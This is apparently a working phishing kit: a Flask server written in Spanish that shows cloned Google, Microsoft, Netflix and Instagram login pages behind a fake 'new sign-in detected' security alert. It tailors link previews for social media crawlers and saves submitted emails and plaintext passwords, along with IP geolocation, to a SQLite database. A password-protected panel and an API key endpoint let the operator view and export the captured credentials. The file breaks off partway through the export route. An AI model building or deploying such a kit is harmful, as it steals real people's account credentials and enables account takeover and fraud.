#!/usr/bin/env python3
import os
import sqlite3
import json
import requests
import hashlib
import re
import logging
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, redirect, jsonify, abort, session

# =============================================
# CONFIGURACIÓN DE LOGGING
# =============================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuración de seguridad de sesión
app.secret_key = os.environ.get('SECRET_KEY', 'clave-secreta-para-session-12345')
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(hours=2)
)

# =============================================
# CONFIGURACIÓN
# =============================================
CONFIG = {
    'redirect_url': 'https://www.google.com',
    'template': 'google',
    'api_key': os.environ.get('API_KEY', 'smiclavesegura2026'),
    'admin_password': 'triple777',
    'max_login_attempts': 5,
    'cleanup_days': 30
}

# Diccionarios para rate limiting
login_attempts = {}
root_requests = {}
audit_log_enabled = True

# =============================================
# FUNCIONES DE AUDITORÍA Y SEGURIDAD
# =============================================
def audit_log(action, details, ip=None):
    if not audit_log_enabled:
        return
    if ip is None:
        ip = get_client_ip()
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'action': action,
        'ip': ip,
        'details': details,
        'authenticated': session.get('admin_logged', False)
    }
    try:
        with open('audit.log', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        logger.error(f"Error en audit log: {e}")

def is_rate_limited(ip, storage, limit=20, window_seconds=60):
    now = datetime.now()
    if ip in storage:
        count, timestamp = storage[ip]
        if (now - timestamp).total_seconds() < window_seconds:
            if count >= limit:
                return True
            storage[ip] = (count + 1, timestamp)
        else:
            storage[ip] = (1, now)
    else:
        storage[ip] = (1, now)
    return False

def is_ip_blocked(ip):
    if ip in login_attempts:
        attempts, block_time = login_attempts[ip]
        if attempts >= CONFIG.get('max_login_attempts', 5):
            if datetime.now() - block_time < timedelta(minutes=5):
                return True
            else:
                del login_attempts[ip]
    return False

def load_config():
    try:
        with open('config.json', 'r') as f:
            CONFIG.update(json.load(f))
    except:
        pass

def init_db():
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                ip TEXT,
                username TEXT,
                password TEXT,
                user_agent TEXT,
                referer TEXT,
                geo_location TEXT
            )
        ''')
        conn.commit()
        conn.close()
        logger.info("Base de datos inicializada correctamente")
    except Exception as e:
        logger.error(f"Error al inicializar la base de datos: {e}")

def cleanup_old_credentials(days=None):
    if days is None:
        days = CONFIG.get('cleanup_days', 30)
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            DELETE FROM credentials 
            WHERE datetime(timestamp) < datetime('now', ?)
        ''', (f'-{days} days',))
        deleted = cursor.rowcount
        conn.commit()
        conn.close()
        if deleted > 0:
            logger.info(f"Eliminadas {deleted} credenciales antiguas (más de {days} días)")
        return deleted
    except Exception as e:
        logger.error(f"Error en cleanup de credenciales: {e}")
        return 0

def get_client_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in str(ip):
        ip = ip.split(',')[0].strip()
    return ip

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=3).json()
        if r.get('status') == 'success':
            return f"{r.get('city', 'Unknown')}, {r.get('country', 'Unknown')}"
    except Exception as e:
        logger.warning(f"Error al obtener geolocalización para {ip}: {e}")
    return "Unknown"

def is_social_crawler(ua):
    social_bots = ['facebookexternalhit', 'twitterbot', 'whatsapp', 'linkedinbot', 
                   'telegrambot', 'discord', 'slackbot', 'pinterest', 'redditbot']
    return any(bot in ua.lower() for bot in social_bots)

def get_template(name='google'):
    templates = {
        'google': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Alerta de seguridad">
    <meta name="twitter:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Alerta de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif}
        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:440px;text-align:center}
        .logo{width:75px;margin-bottom:20px}
        h1{font-size:24px;font-weight:500;margin-bottom:10px;color:#202124}
        p{color:#5f6368;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e8f0fe;color:#1a73e8;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;border:1px solid #dadce0;border-radius:8px;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 3px rgba(26,115,232,0.2)}
        button{width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s}
        button:hover{background:#1557b0;transform:translateY(-2px);box-shadow:0 4px 12px rgba(26,115,232,0.3)}
        .footer{margin-top:25px;font-size:13px;color:#5f6368}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
        <div class="security-badge">🔒 Alerta de seguridad</div>
        <h1>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Continuar</button>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
</body>
</html>''',
        
        'microsoft': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Alerta de seguridad">
    <meta name="twitter:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Alerta de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:440px;text-align:center}
        .logo{width:108px;margin-bottom:20px}
        h1{font-size:24px;font-weight:600;margin-bottom:10px;color:#1b1b1b}
        p{color:#5f6368;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e8f0fe;color:#0067b8;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;border:1px solid #ccc;border-radius:8px;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#0067b8;box-shadow:0 0 0 3px rgba(0,103,184,0.2)}
        button{width:100%;padding:14px;background:#0067b8;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s}
        button:hover{background:#005a9e;transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,103,184,0.3)}
        .footer{margin-top:25px;font-size:13px;color:#5f6368}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
        <div class="security-badge">🔒 Alerta de seguridad</div>
        <h1>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo, teléfono o Skype" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
</body>
</html>''',
        
        'netflix': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Alerta de seguridad">
    <meta name="twitter:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Alerta de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',sans-serif}
        body{background:linear-gradient(135deg,#141414 0%, #000000 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.8);width:100%;max-width:440px;text-align:center}
        h1{color:white;font-size:28px;margin-bottom:10px;font-weight:700}
        p{color:#999;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e50914;color:white;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;background:#333;border:1px solid #555;border-radius:8px;color:white;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#e50914;box-shadow:0 0 0 3px rgba(229,9,20,0.2)}
        input::placeholder{color:#888}
        button{width:100%;padding:14px;background:#e50914;color:white;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s}
        button:hover{background:#f40612;transform:translateY(-2px);box-shadow:0 4px 12px rgba(229,9,20,0.4)}
        .footer{margin-top:25px;font-size:13px;color:#666}
    </style>
</head>
<body>
    <div class="container">
        <h1 style="font-size:40px;font-family:'Helvetica Neue',sans-serif;margin-bottom:30px;">NETFLIX</h1>
        <div class="security-badge">🔒 Alerta de seguridad</div>
        <h1>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
</body>
</html>''',
        
        'instagram': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Alerta de seguridad">
    <meta name="twitter:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Alerta de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,sans-serif}
        body{background:linear-gradient(135deg,#fafafa 0%, #e0e0e0 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:white;border:1px solid #dbdbdb;padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.1);width:100%;max-width:400px;text-align:center}
        .logo{font-size:44px;font-family:'Brush Script MT',cursive;margin-bottom:20px}
        h1{font-size:24px;font-weight:600;margin-bottom:10px;color:#262626}
        p{color:#8e8e8e;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e8f0fe;color:#0095f6;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;background:#fafafa;border:1px solid #dbdbdb;border-radius:8px;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#0095f6;box-shadow:0 0 0 3px rgba(0,149,246,0.2)}
        button{width:100%;padding:14px;background:#0095f6;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}
        button:hover{background:#0081d6;transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,149,246,0.3)}
        .footer{margin-top:25px;font-size:13px;color:#8e8e8e}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <div class="security-badge">🔒 Alerta de seguridad</div>
        <h1>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        <form action="/capture" method="POST">
            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
</body>
</html>'''
    }
    return templates.get(name, templates['google'])

@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    if request.path == '/' or request.path == '/capture':
        response.headers['Content-Security-Policy'] = (
            "default-src 'self'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' https://www.google.com https://i.imgur.com https://aadcdn.msftauth.net; "
            "font-src 'self' https://fonts.gstatic.com; "
            "form-action 'self'; "
            "frame-ancestors 'none'"
        )
    return response

@app.before_request
def limit_root_requests():
    if request.path == '/':
        ip = get_client_ip()
        if is_rate_limited(ip, root_requests, limit=30, window_seconds=60):
            logger.warning(f"Rate limit excedido en raíz desde IP {ip}")
            audit_log('ROOT_RATE_LIMIT', {'ip': ip}, ip)
            return "⏳ Demasiadas visitas. Espera 1 minuto.", 429

@app.before_request
def handle_bots():
    ua = request.headers.get('User-Agent', '')
    if is_social_crawler(ua) and request.path == '/':
        return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Alerta de seguridad">
    <meta name="twitter:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Alerta de seguridad</title>
</head>
<body>
    <h1>Alerta de seguridad</h1>
    <p>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</p>
</body>
</html>
'''), 200

@app.route('/')
def index():
    return render_template_string(get_template(CONFIG.get('template', 'google')))

@app.route('/capture', methods=['POST'])
def capture():
    ip = get_client_ip()
    username = request.form.get('email', '') or request.form.get('username', '')
    password = request.form.get('password', '')
    
    if not username or not password:
        return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
    
    # Sanitizar entrada
    username = re.sub(r'[^a-zA-Z0-9@.\-_\s]', '', username)
    geo = get_geo(ip)
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (datetime.now().isoformat(), ip, username, password,
              request.headers.get('User-Agent', ''), request.headers.get('Referer', ''), geo))
        conn.commit()
        conn.close()
        logger.info(f"✅ Credencial guardada: {username} desde {ip}")
        audit_log('NEW_CREDENTIAL', {'username': username, 'ip': ip}, ip)
    except Exception as e:
        logger.error(f"❌ Error al guardar: {e}")
    
    return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))

@app.route('/login-credenciales', methods=['GET', 'POST'])
def login_credenciales():
    ip = get_client_ip()
    max_attempts = CONFIG.get('max_login_attempts', 5)
    
    if is_ip_blocked(ip):
        audit_log('LOGIN_BLOCKED', {'ip': ip}, ip)
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Acceso Bloqueado</title>
            <style>
                body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
                .error { color: red; margin-top: 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚫 Acceso Bloqueado</h1>
                <p>Has superado el límite de intentos permitidos.</p>
                <p class="error">Espera 5 minutos para volver a intentarlo.</p>
            </div>
        </body>
        </html>
        ''', 429)
    
    if request.method == 'POST':
        password = request.form.get('password')
        if password == CONFIG.get('admin_password', 'triple777'):
            login_attempts.pop(ip, None)
            session['admin_logged'] = True
            session.permanent = True
            logger.info(f"Login exitoso desde IP {ip}")
            audit_log('LOGIN_SUCCESS', {'ip': ip}, ip)
            return redirect('/ver-credenciales')
        else:
            if ip not in login_attempts:
                login_attempts[ip] = [0, datetime.now()]
            login_attempts[ip][0] += 1
            login_attempts[ip][1] = datetime.now()
            remaining = max_attempts - login_attempts[ip][0]
            logger.warning(f"Login fallido desde IP {ip}, intentos: {login_attempts[ip][0]}")
            audit_log('LOGIN_FAILURE', {'ip': ip, 'attempts': login_attempts[ip][0]}, ip)
            
            return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Acceso Denegado</title>
                <style>
                    body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
                    .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
                    .error { color: red; margin-top: 10px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🔒 Contraseña incorrecta</h1>
                    <p class="error">Intentos restantes: ''' + str(remaining) + '''</p>
                    <a href="/login-credenciales">Volver</a>
                </div>
            </body>
            </html>
            ''')
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Acceso a Credenciales</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
            body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
            h1 { color: #1a73e8; margin-bottom: 20px; font-size: 24px; }
            .lock { font-size: 48px; margin-bottom: 15px; }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
            input:focus { outline: none; border-color: #1a73e8; }
            button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
            button:hover { background: #1557b0; }
            .footer { margin-top: 20px; color: #666; font-size: 14px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="lock">🔐</div>
            <h1>Acceso a Credenciales</h1>
            <p style="color:#666; margin-bottom:20px;">Introduce la contraseña de administrador</p>
            <form method="POST">
                <input type="password" name="password" placeholder="Contraseña" required autofocus>
                <button type="submit">Acceder</button>
            </form>
            <div class="footer">Acceso restringido</div>
        </div>
    </body>
    </html>
    ''')

@app.route('/ver-credenciales')
def ver_credenciales():
    if not session.get('admin_logged'):
        return redirect('/login-credenciales')
    
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
    rows = cursor.fetchall()
    conn.close()
    
    if not rows:
        return "<h1>📭 No hay credenciales</h1><a href='/login-credenciales'>Volver</a>"
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Credenciales</title>
        <style>
            body { font-family: Arial; background: #f0f2f5; padding: 20px; }
            h1 { color: #1a73e8; text-align: center; }
            table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            th { background: #1a73e8; color: white; padding: 12px; text-align: left; }
            td { padding: 10px; border-bottom: 1px solid #ddd; }
            tr:hover { background: #f5f5f5; }
            .logout { float: right; background: #dc3545; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; }
            .logout:hover { background: #c82333; }
        </style>
    </head>
    <body>
        <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
        <h1>🔐 Credenciales Capturadas</h1>
        <p>Total: <strong>""" + str(len(rows)) + """</strong></p>
        <table>
            <tr><th>ID</th><th>Fecha</th><th>IP</th><th>Ubicación</th><th>Usuario</th><th>Contraseña</th></tr>
    """
    
    for r in rows:
        html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[5]}</td><td>{r[3]}</td><td><strong>{r[4]}</strong></td></tr>"
    
    html += """
        </table>
    </body>
    </html>
    """
    return html

@app.route('/logout-credenciales')
def logout_credenciales():
    session.pop('admin_logged', None)
    return redirect('/login-credenciales')

@app.route('/api/credentials')
def api_credentials():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        abort(401)
    
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM credentials ORDER BY id DESC')
